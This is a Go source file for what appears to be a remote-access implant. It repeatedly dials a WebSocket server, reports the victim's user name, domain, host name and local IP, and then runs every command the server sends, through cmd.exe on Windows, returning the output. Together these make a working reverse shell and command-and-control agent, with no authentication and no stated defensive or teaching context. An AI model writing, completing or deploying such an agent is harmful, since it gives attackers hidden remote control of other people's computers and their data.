package main

import (
	"fmt"
	"github.com/gorilla/websocket"
	"golang.org/x/text/encoding/charmap"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

func Run(server string) {
	for {
		connection, err := openWebSocketConnection(server)
		if err != nil {
			wait()
			continue
		}
		if err = identifyItself(connection); err != nil {
			fmt.Println(err)
			closeConn(connection)
			continue
		}
		fmt.Printf("Connection to %s established\n", server)
		handleMessages(connection)
		wait()
	}
}

func wait() {
	waitingSeconds := 20
	waiting := time.Duration(waitingSeconds) * time.Second
	fmt.Printf("WebSocket Session ended. Waiting %d seconds to reestablish the session.\n", waitingSeconds)
	time.Sleep(waiting)
}

func handleMessages(connection *websocket.Conn) {
	workingDirectory := "C:\\"
	for {
		messageType, bytes, err := connection.ReadMessage()
		if err != nil {
			fmt.Println(err)
			break
		}
		switch messageType {
		case websocket.TextMessage:
			workingDirectory = handleTextMessage(connection, bytes, workingDirectory)
		case websocket.CloseMessage:
			fmt.Printf("Close frame with message: %s\n", string(bytes))
			closeConn(connection)
			break
		default:
			fmt.Printf("Not supported WS frame of type %d\n", messageType)
		}
	}
}

func handleTextMessage(
	connection *websocket.Conn,
	message []byte,
	workingDirectory string,
) string {
	command := strings.TrimSpace(string(message))
	workingDirectory = resolveWorkingDirectory(workingDirectory, command)
	parsedCommand := parseCommand(command)
	commandResult, err := executeCommand(workingDirectory, parsedCommand)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Printf("Sending command result: %s...\n", commandResult)
	err = connection.WriteMessage(websocket.TextMessage, []byte(commandResult))
	if err != nil {
		fmt.Printf("Could not send message: %s\n", commandResult)
	}
	return workingDirectory
}

func resolveWorkingDirectory(
	currentWorkingDirectory string,
	command string,
) string {
	if strings.Index(command, "cd") < 0 {
		return currentWorkingDirectory
	}
	cdPath := strings.TrimSpace(command[2:])
	if filepath.IsAbs(cdPath) {
		return cdPath
	}
	if cdPath == ".." {
		return filepath.Dir(currentWorkingDirectory)
	}
	if cdPath == "~" || strings.ToLower(cdPath) == "%userprofile%" {
		home, _ := os.UserHomeDir()
		return home
	}
	return filepath.Join(currentWorkingDirectory, cdPath)
}

func executeCommand(workingDirectory string, parsedCommand []string) (string, error) {
	fmt.Printf("Executing command: %s %s\n", workingDirectory, strings.Join(parsedCommand, " "))
	cmd := exec.Command(parsedCommand[0], parsedCommand[1:]...)
	cmd.Dir = workingDirectory
	output, err := cmd.CombinedOutput()
	if runtime.GOOS == "windows" {
		decoder := charmap.CodePage850.NewDecoder()
		output, err = decoder.Bytes(output)
	}
	resultStr := string(output)
	return fmt.Sprintf("%s> %s", workingDirectory, resultStr), err
}

func parseCommand(command string) []string {
	if command == "" {
		return nil
	}

	result := make([]string, 0)

	if runtime.GOOS == "windows" {
		result = append(result, "cmd.exe")
		result = append(result, "/c")
	}

	from := 0
	inQuotes := false
	skip := false

	length := len(command)
	for i := 0; i < length; i++ {
		ch := command[i]
		if skip {
			skip = false
		} else if ch == ' ' {
			if !inQuotes {
				result = append(result, command[from:i])
				from = i + 1
			}
		} else if ch == '"' {
			if inQuotes {
				inQuotes = false
				skip = true
				result = append(result, command[from:i])
				from = i + 2
			} else {
				inQuotes = true
				from = i + 1
			}
		} else if i+1 == length {
			result = append(result, command[from:length])
			from = i
		}
	}
	return result
}

func closeConn(
	connection *websocket.Conn,
) {
	if err := connection.Close(); err != nil {
		fmt.Println(err)
	}
}

func openWebSocketConnection(server string) (*websocket.Conn, error) {
	dialer := websocket.Dialer{
		Proxy:            http.ProxyFromEnvironment,
		HandshakeTimeout: 45 * time.Second,
	}
	conn, _, err := dialer.Dial(server, nil)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	_ = conn.SetReadDeadline(time.Time{})
	_ = conn.SetWriteDeadline(time.Time{})
	return conn, nil
}

func identifyItself(connection *websocket.Conn) error {
	err := connection.WriteJSON(newAgent())
	if err != nil {
		return err
	}
	return nil
}

type Agent struct {
	Name     string `json:"name"`
	HostName string `json:"hostName"`
	LocalIp  string `json:"localIp"`
}

func newAgent() Agent {
	domainAndUserName, err := getDomainAndUserName()
	if err != nil {
		fmt.Println(err.Error())
	}
	if err != nil {
		fmt.Println(err.Error())
	}
	name, err := getHostName()
	if err != nil {
		fmt.Println(err.Error())
	}
	localIp, err := getLocalIp()
	if err != nil {
		fmt.Println(err.Error())
	}
	return Agent{
		Name:     domainAndUserName,
		HostName: name,
		LocalIp:  localIp,
	}
}
